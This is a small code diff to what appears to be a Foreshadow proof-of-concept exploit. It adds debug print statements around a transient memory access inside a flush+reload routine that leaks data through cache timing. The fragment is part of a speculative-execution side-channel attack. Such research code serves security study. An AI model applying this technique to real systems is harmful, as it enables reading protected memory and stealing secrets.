@@ -91,8 +91,9 @@ static inline int __attribute__((always_inline)) foreshadow_round(void *adrs)
      * NOTE: proof-of-concept only: calling application should catch exception
      * and properly restore access rights.
      */
+    printf("[transient_access] %s\n","begin");
     transient_access(fs_oracle, adrs, SLOT_SIZE);
-
+    printf("[transient_access] %s\n","end");
     for (i=0; i < NUM_SLOTS; i++)
         if (reload( SLOT_OFFSET( fs_oracle, i ) ) < fs_reload_threshold)
             return i;
